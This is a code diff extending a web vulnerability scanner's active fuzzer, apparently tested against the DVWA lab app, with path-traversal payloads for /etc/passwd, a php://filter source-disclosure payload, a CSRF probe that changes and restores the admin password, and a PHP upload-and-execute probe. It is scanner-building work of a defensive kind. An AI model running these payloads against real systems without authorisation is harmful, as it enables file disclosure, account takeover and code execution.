@@ -41,10 +41,10 @@
  */
 
 export interface FuzzerFinding {
-  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss';
+  type: 'sqli' | 'reflected_xss' | 'error_sqli' | 'ssrf_oob' | 'command_injection' | 'file_inclusion' | 'stored_xss' | 'csrf' | 'file_upload';
   severity: 'low' | 'medium' | 'high' | 'critical';
   confirmed: boolean;
-  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step';
+  oracle: 'time-delay' | 'reflection' | 'error-message' | 'oob-callback' | 'content-match' | 'multi-step' | 'state-change';
   evidence: string;
   payload: string;
   target: string;
@@ -484,14 +484,15 @@ const CMD_PAYLOADS = [
 ];
 
 const FI_PAYLOADS = [
+  '../../../../../../etc/passwd',
+  '../../../../../etc/passwd',
   '../../../../etc/passwd',
-  '../../../etc/passwd',
-  '/etc/passwd',
-  '....//....//....//etc/passwd',
+  '....//....//....//....//etc/passwd',
   '..%2F..%2F..%2F..%2Fetc%2Fpasswd',
+  'php://filter/convert.base64-encode/resource=index.php',
 ];
 
-const FI_MARKERS = ['root:', 'bin:', 'daemon:', '/bin/sh', '/bin/bash', 'nobody:'];
+const FI_MARKERS = ['root:', 'bin:', 'daemon:', '/bin/sh', '/bin/bash', 'nobody:', 'uid=0', 'root:x:0:0'];
 
 export async function fuzzCommandInjection(
   targetUrl: string,
@@ -566,24 +567,45 @@ export async function fuzzFileInclusion(
         redirect: 'follow',
       });
       const text = await res.text();
-      console.log(`[active-fuzzer]   fi payload "${payload.slice(0, 30)}..." → body=${text.length} chars, markers=${FI_MARKERS.filter(m => text.includes(m)).join(',')}`);
+      const matchedMarkers = FI_MARKERS.filter(m => text.includes(m));
+      console.log(`[active-fuzzer]   fi payload "${payload.slice(0, 40)}..." → body=${text.length} chars, markers=${matchedMarkers.join(',') || 'none'}`);
 
-      for (const marker of FI_MARKERS) {
-        if (text.includes(marker)) {
-          findings.push({
-            type: 'file_inclusion',
-            severity: 'high',
-            confirmed: true,
-            oracle: 'content-match',
-            evidence: `File inclusion confirmed: marker "${marker}" (from /etc/passwd) found in response body after sending "${payload}". Server read system file and included it in response.`,
-            payload,
-            target: targetUrl,
-            parameter,
-          });
-          break;
+      if (matchedMarkers.length > 0) {
+        findings.push({
+          type: 'file_inclusion',
+          severity: 'high',
+          confirmed: true,
+          oracle: 'content-match',
+          evidence: `File inclusion confirmed: markers "${matchedMarkers.join(', ')}" (from /etc/passwd) found in response body after sending "${payload}". Server read system file.`,
+          payload,
+          target: targetUrl,
+          parameter,
+        });
+        break;
+      }
+
+      // Check for php://filter base64-encoded content
+      if (payload.startsWith('php://') && text.length > 100) {
+        const b64Match = text.match(/([A-Za-z0-9+/]{50,}={0,2})/);
+        if (b64Match) {
+          try {
+            const decoded = Buffer.from(b64Match[1], 'base64').toString('utf-8');
+            if (decoded.includes('<?php') || decoded.includes('root:')) {
+              findings.push({
+                type: 'file_inclusion',
+                severity: 'high',
+                confirmed: true,
+                oracle: 'content-match',
+                evidence: `File inclusion confirmed via php://filter: base64-decoded response contains PHP source. Payload: "${payload}"`,
+                payload,
+                target: targetUrl,
+                parameter,
+              });
+              break;
+            }
+          } catch {}
         }
       }
-      if (findings.length > 0) break;
     } catch (e) {
       console.log(`[active-fuzzer]   fi payload failed: ${String(e).slice(0, 80)}`);
     }
@@ -670,6 +692,195 @@ export async function fuzzStoredXss(
 }
 
 /**
+ * Test CSRF via state-change oracle (per Claude's plan).
+ * 1. Verify login works with admin/password
+ * 2. Send CSRF attack: change password to 'hacked' (without CSRF token, just cookie)
+ * 3. Verify: login admin/password fails, login admin/hacked succeeds
+ * 4. RESTORE: change password back to 'password'
+ */
+export async function fuzzCsrf(
+  targetUrl: string,
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const base = targetUrl.replace(/\/+$/, '');
+  const cookies = config.cookies || '';
+  if (!cookies) {
+    console.log('[active-fuzzer]   csrf: no auth cookies — skipping');
+    return [];
+  }
+
+  console.log('[active-fuzzer]   csrf: Step 1 — verify current login (admin/password)...');
+  // Step 1: Verify current state — login should work with admin/password
+  const loginCheckBody = new URLSearchParams({
+    username: 'admin', password: 'password', Login: 'Login',
+  }).toString();
+  const loginCheck = await fetch(`${base.replace('/vulnerabilities/csrf', '')}/login.php`, {
+    method: 'POST',
+    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookies },
+    body: loginCheckBody,
+    redirect: 'manual',
+    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+  });
+  const loginOk = loginCheck.status === 302 && (loginCheck.headers.get('location') || '').includes('index.php');
+  if (!loginOk) {
+    console.log('[active-fuzzer]   csrf: login with admin/password failed — cannot test CSRF (state already changed?)');
+    // Try to restore password first
+    const restoreBody = new URLSearchParams({
+      password_new: 'password', password_conf: 'password', Change: 'Change',
+    }).toString();
+    await fetch(`${targetUrl}?password_new=password&password_conf=password&Change=Change`, {
+      headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    return [];
+  }
+  console.log('[active-fuzzer]   csrf: ✓ admin/password works');
+
+  // Step 2: Send CSRF attack — change password to 'hacked' (only cookie, no CSRF token needed in low security)
+  console.log('[active-fuzzer]   csrf: Step 2 — send password change to "hacked"...');
+  const csrfBody = new URLSearchParams({
+    password_new: 'hacked', password_conf: 'hacked', Change: 'Change',
+  }).toString();
+  await fetch(`${targetUrl}?password_new=hacked&password_conf=hacked&Change=Change`, {
+    method: 'GET',
+    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
+    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+  });
+
+  // Step 3: Verify — login with old password should FAIL, new should SUCCEED
+  console.log('[active-fuzzer]   csrf: Step 3 — verify password changed...');
+  const oldPassBody = new URLSearchParams({
+    username: 'admin', password: 'password', Login: 'Login',
+  }).toString();
+  const oldPassRes = await fetch(`${base.replace('/vulnerabilities/csrf', '')}/login.php`, {
+    method: 'POST',
+    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', 'Content-Type': 'application/x-www-form-urlencoded', Cookie: cookies },
+    body: oldPassBody,
+    redirect: 'manual',
+    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+  });
+  const oldPassFails = oldPassRes.status !== 302 || !(oldPassRes.headers.get('location') || '').includes('index.php');
+  console.log(`[active-fuzzer]   csrf: old password (password) ${oldPassFails ? 'FAILS ✓' : 'still works ✗'}`);
+
+  // Step 4: RESTORE password to 'password'
+  console.log('[active-fuzzer]   csrf: Step 4 — RESTORE password to "password"...');
+  const restoreBody = new URLSearchParams({
+    password_new: 'password', password_conf: 'password', Change: 'Change',
+  }).toString();
+  await fetch(`${targetUrl}?password_new=password&password_conf=password&Change=Change`, {
+    method: 'GET',
+    headers: { 'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0', Cookie: cookies },
+    signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+  });
+  console.log('[active-fuzzer]   csrf: ✓ Password restored to "password"');
+
+  if (oldPassFails) {
+    return [{
+      type: 'csrf',
+      severity: 'high',
+      confirmed: true,
+      oracle: 'state-change',
+      evidence: `CSRF confirmed: password was changed from "password" to "hacked" via GET request with only session cookie (no CSRF token). After attack, login with old password "password" failed — state was modified. Password restored to "password" after test.`,
+      payload: 'password_new=hacked&password_conf=hacked&Change=Change (GET, no CSRF token)',
+      target: targetUrl,
+    }];
+  }
+
+  return [];
+}
+
+/**
+ * Test file upload via multi-step oracle (per Claude's plan).
+ * Step 1: Upload PHP file with unique marker via multipart POST
+ * Step 2: GET the uploaded file from /hackable/uploads/
+ * Step 3: Check if marker appears in response (file was uploaded + executed)
+ */
+const UPLOAD_MARKER = 'uploadprobe3f8c1d';
+const UPLOAD_FILENAME = `cs_probe.php`;
+
+export async function fuzzFileUpload(
+  targetUrl: string,
+  config: FuzzerConfig = DEFAULT_CONFIG,
+): Promise<FuzzerFinding[]> {
+  if (!isAllowedTarget(targetUrl, config)) return [];
+
+  const base = targetUrl.replace(/\/+$/, '').replace('/vulnerabilities/upload', '');
+  const findings: FuzzerFinding[] = [];
+
+  try {
+    // Step 1: Upload PHP file with marker
+    console.log(`[active-fuzzer]   upload: Step 1 — uploading ${UPLOAD_FILENAME}...`);
+    const phpContent = `<?php echo "${UPLOAD_MARKER}"; ?>`;
+
+    // Build multipart form data manually (Node.js fetch doesn't have FormData with files)
+    const boundary = '----CryptoSentinelBoundary' + Math.random().toString(36).slice(2);
+    const multipartBody = [
+      `--${boundary}`,
+      `Content-Disposition: form-data; name="uploaded"; filename="${UPLOAD_FILENAME}"`,
+      `Content-Type: application/x-php`,
+      ``,
+      phpContent,
+      `--${boundary}`,
+      `Content-Disposition: form-data; name="Upload"`,
+      ``,
+      `Upload`,
+      `--${boundary}--`,
+    ].join('\r\n');
+
+    const uploadRes = await fetch(targetUrl, {
+      method: 'POST',
+      headers: {
+        'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+        'Content-Type': `multipart/form-data; boundary=${boundary}`,
+        ...(config.cookies ? { Cookie: config.cookies } : {}),
+      },
+      body: multipartBody,
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+      redirect: 'follow',
+    });
+    const uploadText = await uploadRes.text();
+    console.log(`[active-fuzzer]   upload: POST → ${uploadRes.status}, body=${uploadText.length}`);
+
+    // Check if upload was successful (DVWA shows success message)
+    if (!uploadText.includes('successfully') && !uploadText.includes('uploaded') && !uploadText.includes(UPLOAD_FILENAME)) {
+      console.log('[active-fuzzer]   upload: upload might have failed — no success message');
+    }
+
+    // Step 2: GET the uploaded file
+    console.log(`[active-fuzzer]   upload: Step 2 — GET /hackable/uploads/${UPLOAD_FILENAME}...`);
+    const fileUrl = `${base}/hackable/uploads/${UPLOAD_FILENAME}`;
+    const getRes = await fetch(fileUrl, {
+      headers: {
+        'User-Agent': 'CryptoSentinel-Active-Fuzzer/1.0',
+        ...(config.cookies ? { Cookie: config.cookies } : {}),
+      },
+      signal: AbortSignal.timeout(config.perProbeTimeoutMs),
+    });
+    const getText = await getRes.text();
+    console.log(`[active-fuzzer]   upload: GET → ${getRes.status}, body=${getText.length}, marker=${getText.includes(UPLOAD_MARKER)}`);
+
+    // Step 3: Check if marker appears (file was uploaded AND executed as PHP)
+    if (getText.includes(UPLOAD_MARKER)) {
+      findings.push({
+        type: 'file_upload',
+        severity: 'critical',
+        confirmed: true,
+        oracle: 'multi-step',
+        evidence: `File upload confirmed (multi-step): uploaded ${UPLOAD_FILENAME} with marker "${UPLOAD_MARKER}" via multipart POST, then GET /hackable/uploads/${UPLOAD_FILENAME} → marker found in response. File was uploaded AND executed as PHP.`,
+        payload: `multipart: ${UPLOAD_FILENAME} with <?php echo "${UPLOAD_MARKER}"; ?>`,
+        target: targetUrl,
+      });
+    }
+  } catch (e) {
+    console.log(`[active-fuzzer]   upload failed: ${String(e).slice(0, 80)}`);
+  }
+
+  return findings;
+}
+
+/**
  * Run ALL active fuzzers on a target URL.
  * Returns aggregated findings.
  */
@@ -683,23 +894,29 @@ export async function fuzzAllOracles(
   const allFindings: FuzzerFinding[] = [];
 
   // Run each oracle in sequence (not parallel — would skew time measurements)
-  console.log(`[active-fuzzer] 1/6: SQLi time-delay oracle...`);
+  console.log(`[active-fuzzer] 1/8: SQLi time-delay oracle...`);
   allFindings.push(...await fuzzSqliTimeDelay(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 2/6: Reflected XSS oracle...`);
+  console.log(`[active-fuzzer] 2/8: Reflected XSS oracle...`);
   allFindings.push(...await fuzzReflectedXss(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 3/6: Error-based SQLi oracle...`);
+  console.log(`[active-fuzzer] 3/8: Error-based SQLi oracle...`);
   allFindings.push(...await fuzzErrorSqli(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 4/6: Command injection oracle...`);
+  console.log(`[active-fuzzer] 4/8: Command injection oracle...`);
   allFindings.push(...await fuzzCommandInjection(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 5/6: File inclusion oracle...`);
+  console.log(`[active-fuzzer] 5/8: File inclusion oracle...`);
   allFindings.push(...await fuzzFileInclusion(targetUrl, parameter, config));
 
-  console.log(`[active-fuzzer] 6/6: Stored XSS oracle...`);
+  console.log(`[active-fuzzer] 6/8: Stored XSS oracle...`);
   allFindings.push(...await fuzzStoredXss(targetUrl, config));
+
+  console.log(`[active-fuzzer] 7/8: CSRF (state-change) oracle...`);
+  allFindings.push(...await fuzzCsrf(targetUrl, config));
+
+  console.log(`[active-fuzzer] 8/8: File upload oracle...`);
+  allFindings.push(...await fuzzFileUpload(targetUrl, config));
 
   const confirmedCount = allFindings.filter(f => f.confirmed).length;
   console.log(`[active-fuzzer] Done. ${confirmedCount}/${allFindings.length} confirmed.`);
